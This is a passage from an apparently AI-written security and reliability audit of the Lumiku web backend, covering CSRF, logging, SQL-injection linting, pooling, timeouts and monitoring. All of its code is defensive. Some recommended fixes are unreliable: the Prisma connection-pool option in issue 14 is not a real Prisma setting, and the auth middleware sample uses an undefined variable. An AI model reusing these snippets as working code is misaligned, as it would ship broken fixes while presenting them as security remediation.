    crackTime: result.crack_times_display.offline_slow_hashing_1e4_per_second,
    isCommon: COMMON_PASSWORDS.has(password.toLowerCase())
  })
})
```

**Additional Recommendations:**

1. Implement password history (prevent reusing last 5 passwords)
2. Add password expiration for admin accounts (90 days)
3. Require password change on first login
4. Implement account lockout after 5 failed attempts
5. Add 2FA requirement for high-value accounts
6. Monitor for credential stuffing attacks

---

### 10. Missing CSRF Protection

**Severity:** P1 - HIGH
**Impact:** State-changing operations via CSRF
**Location:**
- All state-changing endpoints (POST, PUT, DELETE)

**Description:**

The application uses JWT tokens in Authorization headers, which provides some CSRF protection. However, if tokens are ever stored in cookies, or if the frontend caches tokens in localStorage (accessible to XSS), CSRF attacks become possible.

**Current State:**
- No CSRF tokens implemented
- Relies solely on JWT in Authorization header
- No SameSite cookie attributes if cookies are used
- No Origin/Referer validation

**Risk Scenarios:**

1. **Token Theft via XSS:** If XSS vulnerability exists, attacker steals token from localStorage and makes requests
2. **Cookie-Based Auth:** If JWT ever moves to cookies without CSRF protection, vulnerable
3. **CORS Misconfiguration:** Overly permissive CORS allows attacker-controlled origin

**Recommended Fix:**

```typescript
import { randomBytes } from 'crypto'

// CSRF Token Middleware
export const csrfProtection = () => {
  return async (c: Context, next: Next) => {
    const method = c.req.method

    // Only protect state-changing methods
    if (['GET', 'HEAD', 'OPTIONS'].includes(method)) {
      await next()
      return
    }

    // 1. Verify Origin header
    const origin = c.req.header('Origin')
    const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || []

    if (origin && !allowedOrigins.includes(origin)) {
      return c.json({ error: 'Invalid origin' }, 403)
    }

    // 2. Verify custom header (double-submit pattern)
    const csrfHeader = c.req.header('X-CSRF-Token')
    const csrfCookie = c.req.header('Cookie')?.match(/csrf_token=([^;]+)/)?.[1]

    if (!csrfHeader || !csrfCookie || csrfHeader !== csrfCookie) {
      return c.json({ error: 'CSRF token mismatch' }, 403)
    }

    await next()
  }
}

// Generate CSRF token endpoint
authRoutes.get('/csrf-token', async (c) => {
  const token = randomBytes(32).toString('hex')

  // Set cookie with secure attributes
  c.header('Set-Cookie', `csrf_token=${token}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400`)

  return c.json({ csrfToken: token })
})

// Apply to app
app.use('*', csrfProtection())
```

**Alternative - Use SameSite Cookies:**

```typescript
// If using cookies for auth, set SameSite=Strict
app.use('*', async (c, next) => {
  await next()

  // Add security headers
  c.header('X-Content-Type-Options', 'nosniff')
  c.header('X-Frame-Options', 'DENY')
  c.header('X-XSS-Protection', '1; mode=block')
  c.header('Referrer-Policy', 'strict-origin-when-cross-origin')
  c.header('Content-Security-Policy', "default-src 'self'")
})
```

---

## Medium Priority Issues (P2)

### 11. Unhandled Promise Rejections in Workers

**Severity:** P2 - MEDIUM
**Impact:** Silent failures, job loss, data inconsistency
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\workers\video-mixer.worker.ts:22-294`
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\workers\carousel-mix.worker.ts:8-21`

**Description:**

Worker processes handle errors within job processing but don't have global unhandled rejection handlers. Errors outside job context are silently swallowed, leading to zombie processes.

**Recommended Fix:**

```typescript
// Add to all worker files
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Promise Rejection in worker:', reason)
  console.error('Promise:', promise)

  // Log to monitoring service
  // sentry.captureException(reason)

  // Exit process to trigger restart by process manager
  process.exit(1)
})

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception in worker:', error)

  // Log to monitoring service
  // sentry.captureException(error)

  // Cleanup and exit
  process.exit(1)
})
```

---

### 12. SQL Injection Risk in Raw Queries

**Severity:** P2 - MEDIUM
**Impact:** Data breach, unauthorized access
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\app.ts:89-95`

**Description:**

While most queries use Prisma ORM (which prevents SQL injection), some health check endpoints use raw SQL queries. These are currently safe but could become vulnerable if modified.

**Current Code:**
```typescript
// app.ts:89-95
const result = await prisma.$queryRaw<any[]>`
  SELECT EXISTS (
    SELECT FROM information_schema.tables
    WHERE table_schema = 'public'
    AND table_name = ${table}  // Parameterized - SAFE
  ) as exists
`
```

**Recommendation:**

Document SQL injection prevention policy and add linting rules:

```typescript
// Create sql-injection-check.eslint.js
module.exports = {
  rules: {
    'no-raw-sql': {
      create(context) {
        return {
          TaggedTemplateExpression(node) {
            if (node.tag.name === '$queryRaw' || node.tag.property?.name === '$queryRaw') {
              // Check for string concatenation in template
              node.quasi.expressions.forEach(expr => {
                if (expr.type === 'BinaryExpression' && expr.operator === '+') {
                  context.report({
                    node,
                    message: 'Raw SQL queries must use parameterized queries. String concatenation detected.'
                  })
                }
              })
            }
          }
        }
      }
    }
  }
}
```

---

### 13. Insufficient Logging for Security Events

**Severity:** P2 - MEDIUM
**Impact:** Difficult incident investigation, missed attacks
**Location:**
- All authentication and authorization endpoints
- Payment handling

**Description:**

While basic logging exists, critical security events lack structured logging with sufficient context for incident response and forensic analysis.

**Missing Logs:**
- Failed authentication attempts with details (IP, user-agent, time)
- Authorization failures (who tried to access what)
- Credit/quota manipulation attempts
- File upload rejections
- Rate limit violations
- Payment callback anomalies

**Recommended Fix:**

```typescript
// src/lib/security-logger.ts
import pino from 'pino'

const securityLogger = pino({
  name: 'security',
  level: 'info',
  formatters: {
    level: (label) => {
      return { level: label }
    }
  },
  timestamp: pino.stdTimeFunctions.isoTime,
})

export enum SecurityEventType {
  AUTH_SUCCESS = 'auth.success',
  AUTH_FAILURE = 'auth.failure',
  AUTH_RATE_LIMITED = 'auth.rate_limited',
  AUTHZ_DENIED = 'authz.denied',
  CREDIT_DEDUCT_FAILED = 'credit.deduct_failed',
  QUOTA_EXCEEDED = 'quota.exceeded',
  FILE_UPLOAD_REJECTED = 'file.upload_rejected',
  PAYMENT_CALLBACK_INVALID = 'payment.callback_invalid',
  SUSPICIOUS_ACTIVITY = 'suspicious.activity',
}

interface SecurityEvent {
  type: SecurityEventType
  userId?: string
  ipAddress?: string
  userAgent?: string
  resource?: string
  action?: string
  reason?: string
  metadata?: Record<string, any>
}

export function logSecurityEvent(event: SecurityEvent) {
  securityLogger.info({
    event_type: event.type,
    user_id: event.userId,
    ip_address: event.ipAddress,
    user_agent: event.userAgent,
    resource: event.resource,
    action: event.action,
    reason: event.reason,
    ...event.metadata,
    timestamp: new Date().toISOString(),
  })

  // Send to SIEM if critical
  if (isCriticalEvent(event.type)) {
    sendToSIEM(event)
  }
}

function isCriticalEvent(type: SecurityEventType): boolean {
  return [
    SecurityEventType.AUTHZ_DENIED,
    SecurityEventType.PAYMENT_CALLBACK_INVALID,
    SecurityEventType.SUSPICIOUS_ACTIVITY,
  ].includes(type)
}

// Usage in auth middleware:
export const authMiddleware = async (c: Context, next: Next) => {
  const authHeader = c.req.header('Authorization')
  const ipAddress = c.req.header('X-Forwarded-For') || c.req.header('X-Real-IP')
  const userAgent = c.req.header('User-Agent')

  if (!authHeader) {
    logSecurityEvent({
      type: SecurityEventType.AUTH_FAILURE,
      ipAddress,
      userAgent,
      reason: 'No authorization header',
    })
    return c.json({ error: 'Unauthorized' }, 401)
  }

  try {
    const payload = verifyToken(token)

    logSecurityEvent({
      type: SecurityEventType.AUTH_SUCCESS,
      userId: payload.userId,
      ipAddress,
      userAgent,
    })

    await next()
  } catch (error) {
    logSecurityEvent({
      type: SecurityEventType.AUTH_FAILURE,
      ipAddress,
      userAgent,
      reason: 'Invalid token',
    })
    return c.json({ error: 'Unauthorized' }, 401)
  }
}
```

---

### 14. Missing Database Connection Pooling Configuration

**Severity:** P2 - MEDIUM
**Impact:** Connection exhaustion, performance degradation
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\db\client.ts`

**Description:**

Prisma Client instantiation doesn't explicitly configure connection pool settings. This can lead to connection exhaustion under load.

**Recommended Fix:**

```typescript
// db/client.ts
import { PrismaClient } from '@prisma/client'

const prismaClientSingleton = () => {
  return new PrismaClient({
    log: ['error', 'warn'],
    datasources: {
      db: {
        url: process.env.DATABASE_URL,
      },
    },
    // Connection pool configuration
    connection: {
      pool: {
        min: 2,
        max: 10,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 5000,
      },
    },
  })
}

const prisma = globalThis.prismaGlobal ?? prismaClientSingleton()

if (process.env.NODE_ENV !== 'production') {
  globalThis.prismaGlobal = prisma
}

// Graceful shutdown
process.on('SIGTERM', async () => {
  await prisma.$disconnect()
})

export default prisma
```

---

### 15. No Request Timeout Configuration

**Severity:** P2 - MEDIUM
**Impact:** Resource exhaustion, DoS
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\index.ts:90-94`

**Description:**

Server timeout is set to maximum (255 seconds for Bun), but individual route handlers have no timeout protection. Long-running operations can exhaust resources.

**Recommended Fix:**

```typescript
// middleware/timeout.middleware.ts
export const timeoutMiddleware = (timeoutMs: number = 30000) => {
  return async (c: Context, next: Next) => {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs)

    c.req.raw.signal.addEventListener('abort', () => {
      clearTimeout(timeoutId)
    })

    try {
      await next()
      clearTimeout(timeoutId)
    } catch (error: any) {
      clearTimeout(timeoutId)
      if (error.name === 'AbortError') {
        return c.json({ error: 'Request timeout' }, 408)
      }
      throw error
    }
  }
}

// Apply to routes
app.use('*', timeoutMiddleware(30000)) // 30 second timeout for most routes
app.use('/api/apps/*/generate', timeoutMiddleware(60000)) // 60s for generation endpoints
```

---

## Low Priority Issues (P3)

### 16. Inconsistent Error Response Format

**Severity:** P3 - LOW
**Impact:** Poor developer experience, difficult error handling
**Location:**
- Multiple route handlers across the application

**Description:**

Error responses use inconsistent formats, making it difficult for frontend to handle errors uniformly.

**Examples:**
```typescript
// Some routes:
return c.json({ error: 'Something went wrong' }, 400)

// Others:
return c.json({ message: 'Failed to process', success: false }, 500)

// Yet others:
return c.json({ error: { code: 'INVALID_INPUT', details: [...] } }, 422)
```

**Recommended Fix:**

Create standardized error response format:

```typescript
// types/api-response.ts
export interface ErrorResponse {
  success: false
  error: {
    code: string
    message: string
    details?: any
    timestamp: string
    requestId?: string
  }
}

export interface SuccessResponse<T> {
  success: true
  data: T
  message?: string
  timestamp: string
}

export enum ErrorCode {
  UNAUTHORIZED = 'UNAUTHORIZED',
  FORBIDDEN = 'FORBIDDEN',
  NOT_FOUND = 'NOT_FOUND',
  INVALID_INPUT = 'INVALID_INPUT',
  INSUFFICIENT_CREDITS = 'INSUFFICIENT_CREDITS',
  QUOTA_EXCEEDED = 'QUOTA_EXCEEDED',
  INTERNAL_ERROR = 'INTERNAL_ERROR',
}

export function errorResponse(
  code: ErrorCode,
  message: string,
  details?: any
): ErrorResponse {
  return {
    success: false,
    error: {
      code,
      message,
      details,
      timestamp: new Date().toISOString(),
    },
  }
}

// Use consistently:
if (!hasEnoughCredits) {
  return c.json(
    errorResponse(
      ErrorCode.INSUFFICIENT_CREDITS,
      'Not enough credits',
      { required: 10, current: 5 }
    ),
    402
  )
}
```

---

### 17. Missing API Versioning Strategy

**Severity:** P3 - LOW
**Impact:** Breaking changes affect all clients
**Location:**
- All API routes

**Description:**

API routes lack versioning, making it difficult to evolve the API without breaking existing clients.

**Recommended Fix:**

```typescript
// v1/index.ts
const v1 = new Hono()
v1.route('/auth', authRoutesV1)
v1.route('/credits', creditsRoutesV1)
// ...

app.route('/api/v1', v1)

// Future: v2 with breaking changes
const v2 = new Hono()
v2.route('/auth', authRoutesV2)
app.route('/api/v2', v2)

// Redirect /api/* to /api/v1/* for backwards compatibility
app.all('/api/*', async (c) => {
  const path = c.req.path.replace('/api/', '/api/v1/')
  return c.redirect(path, 308)
})
```

---

### 18. No Health Check for External Dependencies

**Severity:** P3 - LOW
**Impact:** Difficult troubleshooting, delayed incident detection
**Location:**
- `C:\Users\yoppi\Downloads\Lumiku App\backend\src\app.ts:39-132`

**Description:**

Health checks only verify database connectivity. External dependencies (Redis, FFmpeg, AI APIs) are not monitored.

**Recommended Fix:**

```typescript
app.get('/health/detailed', async (c) => {
  const checks = {
    database: false,
    redis: false,
    ffmpeg: false,
    storage: false,
  }

  // Check database
  try {
    await prisma.$queryRaw`SELECT 1`
    checks.database = true
  } catch {}

  // Check Redis
  try {
    await redis?.ping()
    checks.redis = true
  } catch {}

  // Check FFmpeg
  try {
    await new Promise((resolve, reject) => {
      exec('ffmpeg -version', (error) => {
        error ? reject() : resolve(null)
      })
    })
    checks.ffmpeg = true
  } catch {}

  // Check storage
  try {
    await fs.access('./uploads')
    checks.storage = true
  } catch {}

  const healthy = Object.values(checks).every(Boolean)

  return c.json(
    {
      status: healthy ? 'healthy' : 'degraded',
      checks,
      timestamp: new Date().toISOString(),
    },
    healthy ? 200 : 503
  )
})
```

---

### 19. Missing Frontend Input Validation

**Severity:** P3 - LOW
**Impact:** Poor UX, unnecessary API calls
**Location:**
- Frontend form components

**Description:**

Frontend forms rely entirely on backend validation. Client-side validation would improve UX and reduce unnecessary API calls.

**Recommended Fix:**

Use Zod schemas shared between frontend and backend:

```typescript
// shared/validation/auth.schema.ts
import { z } from 'zod'

export const loginSchema = z.object({
  email: z.string().email('Invalid email'),
  password: z.string().min(1, 'Password required'),
})

export const registerSchema = z.object({
  email: z.string().email('Invalid email'),
  password: z.string()
    .min(12, 'Password must be at least 12 characters')
    .regex(/[a-z]/, 'Password must include lowercase letter')
    .regex(/[A-Z]/, 'Password must include uppercase letter')
    .regex(/[0-9]/, 'Password must include digit'),
  name: z.string().optional(),
})

// Use in frontend:
import { registerSchema } from '@/shared/validation/auth.schema'

function RegisterForm() {
  const handleSubmit = async (data: any) => {
    const result = registerSchema.safeParse(data)

    if (!result.success) {
      setErrors(result.error.flatten().fieldErrors)
      return
    }

    // Submit to API
    await api.register(result.data)
  }
}
```

---

## Monitoring Recommendations

To detect and respond to these issues in production, implement the following monitoring:

### 1. Application Metrics

**Key Metrics:**
- Request rate, latency, error rate per endpoint
- Credit balance distribution and negative balance occurrences
- Quota usage and exceeded quota events
- FFmpeg process count and memory usage
- Worker job queue depth and processing time
- File upload rate and storage usage growth
- Failed authentication attempts per IP/user
- Rate limit violations by endpoint

**Tools:**
- Prometheus + Grafana
- Datadog
- New Relic
- Application-specific metrics dashboard

### 2. Log Aggregation and Analysis

**Log Events to Track:**
- All authentication failures (user, IP, timestamp)
- Authorization denials (resource, action, user)
- Credit/quota manipulation attempts
- Payment callback anomalies
- File upload rejections
- SQL query errors
- Unhandled exceptions
- Worker process crashes

**Tools:**
- ELK Stack (Elasticsearch, Logstash, Kibana)
- Splunk
- Loki + Grafana
- AWS CloudWatch

### 3. Error Tracking

**Frontend:**
- Uncaught exceptions
- Unhandled promise rejections
- Network errors
- Component mount/unmount errors
- User action failures

**Backend:**
- Unhandled promise rejections
- Database connection errors
- External API failures
- Worker job failures
- FFmpeg process errors

**Tools:**
- Sentry
- Rollbar
- LogRocket
- Bugsnag

### 4. Security Monitoring

**Events to Alert On:**
- 10+ failed login attempts from same IP within 5 minutes
- 5+ different accounts accessed from same IP within 1 hour
- Negative credit balance detected
- User exceeds quota by >10%
- File upload rejected for security reasons
- Payment callback with invalid signature
- Admin action from unusual IP/location
- Bulk data export requests

**Tools:**
- Custom alerting via Prometheus AlertManager
- SIEM integration (Splunk, ELK Security)
- PagerDuty for critical alerts
- Slack/Discord webhooks for team notifications

### 5. Infrastructure Monitoring

**System Metrics:**
- CPU usage per service
- Memory usage and potential leaks
- Disk space and I/O utilization
- Network bandwidth
- Database connection pool saturation
- Redis memory usage and connection count
- FFmpeg process orphans

**Tools:**
- node-exporter + Prometheus
- cAdvisor for containers
- Cloud provider monitoring (AWS CloudWatch, GCP Stackdriver)

### 6. Synthetic Monitoring

**Health Checks:**
- API endpoint availability every 1 minute
- Full user journey tests every 5 minutes
- Critical path transactions every 10 minutes
- External dependency connectivity

**Tools:**
- Pingdom
- UptimeRobot
- Custom health check scripts
- Kubernetes liveness/readiness probes

### 7. Alert Thresholds

**Critical (P0) - Immediate Response:**
- Error rate >5% for any endpoint
- API response time p99 >5 seconds
- Worker job failure rate >10%
- Database connection pool exhausted
- FFmpeg process count >50
- Negative credit balance detected
- Payment callback signature mismatch

**High (P1) - Respond within 1 hour:**
- Error rate >2% sustained for 10 minutes
- Credit deduction failure rate >1%
- Storage quota exceeded by >5 users
- Rate limit violations >100/minute
- 5+ failed login attempts for same user

**Medium (P2) - Respond within 4 hours:**
- Slow query warnings (>1 second)
- Memory usage >80%
- Disk space <20% free
- Worker queue depth >100 jobs
- Unusual API usage patterns

**Low (P3) - Review during business hours:**
- Deprecation warnings
- Minor configuration issues
- Non-critical dependency updates

---

## Remediation Priority

**Immediate (Week 1):**
1. Fix race condition in credit system (P0-1)
2. Implement FFmpeg process cleanup (P0-2)
3. Add React error boundaries (P0-3)

**Short-term (Month 1):**
4. Fix quota management race condition (P1-4)
5. Implement file upload validation (P1-5)
6. Add input sanitization (P1-6)
7. Enhance rate limiting (P1-7)
8. Fix storage quota race condition (P1-8)

**Medium-term (Quarter 1):**
9. Strengthen password policy (P1-9)
10. Implement CSRF protection (P1-10)
11. Add unhandled rejection handlers (P2-11)
12. Improve security logging (P2-13)

**Long-term (Quarter 2+):**
13. SQL injection prevention policy (P2-12)
14. Database connection pooling (P2-14)
15. Request timeout configuration (P2-15)
16. Standardize error responses (P3-16)
17. API versioning (P3-17)
18. Enhanced health checks (P3-18)
19. Frontend validation (P3-19)

---

## Conclusion

This audit identified **19 issues** across the Lumiku application codebase, with **3 critical (P0)**, **7 high (P1)**, **5 medium (P2)**, and **4 low (P3)** priority issues.

The most critical risks involve race conditions in the credit/quota systems, memory leaks in video processing, and missing error boundaries in the frontend. These should be addressed immediately to prevent data integrity issues, service outages, and poor user experience.

The codebase demonstrates good security practices in many areas, including comprehensive rate limiting, structured input validation, and payment security measures. However, the identified gaps represent significant risks in a production environment handling financial transactions and user-generated content.

**Overall Assessment:** The application is production-ready with moderate risk, requiring immediate attention to P0 issues before handling significant user load. P1 issues should be addressed within the first month of production operation.

**Next Steps:**
1. Create GitHub issues for each P0 and P1 item
2. Implement monitoring and alerting infrastructure
3. Establish incident response procedures
4. Schedule regular security audits (quarterly)
5. Implement automated security testing in CI/CD pipeline

---

**Document Version:** 1.0
**Last Updated:** 2025-10-14
**Reviewed By:** Claude Code - Staff Software Engineer
**Next Review:** 2025-11-14 (30 days)
